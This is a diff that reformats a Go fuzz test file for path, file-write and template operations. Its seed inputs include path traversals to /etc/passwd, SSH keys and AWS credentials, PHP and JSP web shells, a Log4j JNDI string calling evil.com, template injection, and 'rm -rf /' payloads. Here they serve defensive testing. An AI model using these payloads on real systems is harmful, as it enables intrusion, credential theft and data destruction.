@@ -43,12 +43,12 @@ func FuzzPathOperations(f *testing.F) {
 		"normal/path\n/etc/passwd",
 		strings.Repeat("../", 100) + "etc/passwd",
 		strings.Repeat("A", 10000), // Long path
-		"con", // Windows reserved name
-		"prn", // Windows reserved name
-		"aux", // Windows reserved name
-		"nul", // Windows reserved name
-		"com1", // Windows reserved name
-		"lpt1", // Windows reserved name
+		"con",                      // Windows reserved name
+		"prn",                      // Windows reserved name
+		"aux",                      // Windows reserved name
+		"nul",                      // Windows reserved name
+		"com1",                     // Windows reserved name
+		"lpt1",                     // Windows reserved name
 		"file:///etc/passwd",
 		"\\\\server\\share\\file",
 		"//server/share/file",
@@ -59,7 +59,7 @@ func FuzzPathOperations(f *testing.F) {
 		"normal/./././././././././././././././etc/passwd",
 		"normal/path/to/file.txt/../../../../../../etc/passwd",
 		"normal/path/to/file.txt%00.jpg",
-		"☃/❄/🎅", // Unicode
+		"☃/❄/🎅",            // Unicode
 		"\x00\x01\x02\x03", // Control characters
 		"normal/path/../../../.ssh/authorized_keys",
 		"normal/path/../../../.aws/credentials",
@@ -85,7 +85,7 @@ func FuzzPathOperations(f *testing.F) {
 
 		// Test CleanPath
 		cleaned := pathOps.CleanPath(path)
-		
+
 		// Check for path traversal indicators in cleaned path
 		if strings.Contains(path, "..") && !strings.Contains(cleaned, "..") {
 			// This is good - path traversal was neutralized
@@ -95,7 +95,7 @@ func FuzzPathOperations(f *testing.F) {
 		// Test JoinPath with potentially malicious segments
 		segments := strings.Split(path, string(filepath.Separator))
 		joined := pathOps.JoinPath(segments...)
-		
+
 		// Verify no null bytes in result
 		if strings.Contains(joined, "\x00") {
 			// This is actually good - we're detecting a security issue
@@ -104,7 +104,7 @@ func FuzzPathOperations(f *testing.F) {
 
 		// Test ExpandPath
 		expanded := pathOps.ExpandPath(path)
-		
+
 		// Check for command injection indicators
 		if strings.ContainsAny(path, "$`|;&") && expanded != path {
 			// Check if expansion led to unexpected results
@@ -118,7 +118,7 @@ func FuzzPathOperations(f *testing.F) {
 		if isAbs {
 			// Absolute paths could be attempting to access system files
 			if strings.Contains(strings.ToLower(path), "etc/passwd") ||
-			   strings.Contains(strings.ToLower(path), "windows/system32") {
+				strings.Contains(strings.ToLower(path), "windows/system32") {
 				t.Logf("Warning: Absolute path to sensitive location: %s", path)
 			}
 		}
@@ -126,7 +126,7 @@ func FuzzPathOperations(f *testing.F) {
 		// Test BaseName and DirName
 		base := pathOps.BaseName(path)
 		_ = pathOps.DirName(path) // dir not used but we test the function
-		
+
 		// Verify no path separators in basename (except for edge cases)
 		if base != path && strings.ContainsAny(base, "/\\") {
 			// filepath.Base() returns the original path if it's all separators
@@ -158,20 +158,20 @@ func FuzzFileOperations(f *testing.F) {
 		{"con", "windows reserved"},
 		{"prn.txt", "windows reserved with extension"},
 		{strings.Repeat("a", 300) + ".txt", "long filename"},
-		{"file.txt", strings.Repeat("A", 10*1024*1024)}, // 10MB content
-		{"file.txt", "\x00\x01\x02\x03"}, // Binary content
-		{"file.txt", "line1\r\nline2\r\nline3"}, // CRLF
-		{"file.txt", "#!/bin/bash\nrm -rf /"}, // Malicious script
-		{"file.php", "<?php system($_GET['cmd']); ?>"}, // PHP shell
+		{"file.txt", strings.Repeat("A", 10*1024*1024)},                                 // 10MB content
+		{"file.txt", "\x00\x01\x02\x03"},                                                // Binary content
+		{"file.txt", "line1\r\nline2\r\nline3"},                                         // CRLF
+		{"file.txt", "#!/bin/bash\nrm -rf /"},                                           // Malicious script
+		{"file.php", "<?php system($_GET['cmd']); ?>"},                                  // PHP shell
 		{"file.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"}, // JSP shell
-		{"file.txt", "${jndi:ldap://evil.com/a}"}, // Log4j
-		{"file.txt", "{{7*7}}"}, // Template injection
-		{".htaccess", "Options +Indexes"}, // Apache config
-		{"web.config", "<?xml version=\"1.0\"?><configuration></configuration>"}, // IIS config
-		{".git/config", "[core]\nrepositoryformatversion = 0"}, // Git config
-		{".ssh/authorized_keys", "ssh-rsa AAAAB3NzaC1yc2EA..."}, // SSH keys
-		{"../../.bashrc", "alias ls='rm -rf /'"}, // Shell config
-		{"symlink", "link -> /etc/passwd"}, // Symlink content
+		{"file.txt", "${jndi:ldap://evil.com/a}"},                                       // Log4j
+		{"file.txt", "{{7*7}}"},                                                         // Template injection
+		{".htaccess", "Options +Indexes"},                                               // Apache config
+		{"web.config", "<?xml version=\"1.0\"?><configuration></configuration>"},        // IIS config
+		{".git/config", "[core]\nrepositoryformatversion = 0"},                          // Git config
+		{".ssh/authorized_keys", "ssh-rsa AAAAB3NzaC1yc2EA..."},                         // SSH keys
+		{"../../.bashrc", "alias ls='rm -rf /'"},                                        // Shell config
+		{"symlink", "link -> /etc/passwd"},                                              // Symlink content
 		{"file:test.txt", "colon in filename"},
 		{"file|test.txt", "pipe in filename"},
 		{"file>test.txt", "redirect in filename"},
@@ -201,10 +201,10 @@ func FuzzFileOperations(f *testing.F) {
 
 		// Create a temporary directory for safe testing
 		tempDir := t.TempDir()
-		
+
 		// Attempt to join filename with temp directory
 		testPath := filepath.Join(tempDir, filename)
-		
+
 		// Check if the resulting path is still within tempDir
 		absTestPath, err := filepath.Abs(testPath)
 		if err == nil {
@@ -381,11 +381,11 @@ func FuzzTemplateOperations(f *testing.F) {
 		// Test ProcessTemplate
 		ctx := context.Background()
 		err := templateOps.ProcessTemplate(ctx, templatePath, outputPath, vars)
-		
+
 		if err != nil {
 			// Template errors are expected for malicious input
 			errStr := err.Error()
-			
+
 			// Check for template injection indicators
 			if strings.Contains(errStr, "function") && strings.Contains(template, "range") {
 				t.Logf("Potential template injection blocked: %s", template)
@@ -396,22 +396,22 @@ func FuzzTemplateOperations(f *testing.F) {
 		// If template succeeded, check output
 		if output, err := os.ReadFile(outputPath); err == nil {
 			outputStr := string(output)
-			
+
 			// Check for successful injections
 			if strings.Contains(template, "7*7") && strings.Contains(outputStr, "49") {
 				t.Errorf("Math expression evaluated in template: %s -> %s", template, outputStr)
 			}
-			
+
 			// Check for path traversal in output
 			if strings.Contains(outputStr, "/etc/passwd") && !strings.Contains(template, "/etc/passwd") {
 				t.Errorf("Path traversal in template output: %s", outputStr)
 			}
-			
+
 			// Check for script injection
 			if strings.Contains(outputStr, "<script>") && !strings.Contains(template, "<script>") {
 				t.Logf("Warning: Unescaped script in output: %s", outputStr)
 			}
-			
+
 			// Check output size (DoS prevention)
 			if len(output) > 10*1024*1024 { // 10MB
 				t.Errorf("Excessive output size: %d bytes", len(output))
@@ -514,7 +514,7 @@ func FuzzSafeOperations(f *testing.F) {
 
 		// Test WithTransaction
 		err := safeOps.WithTransaction(ctx, operations)
-		
+
 		if err != nil {
 			// Transaction failed - verify rollback
 			// This is hard to verify without knowing the state before operations
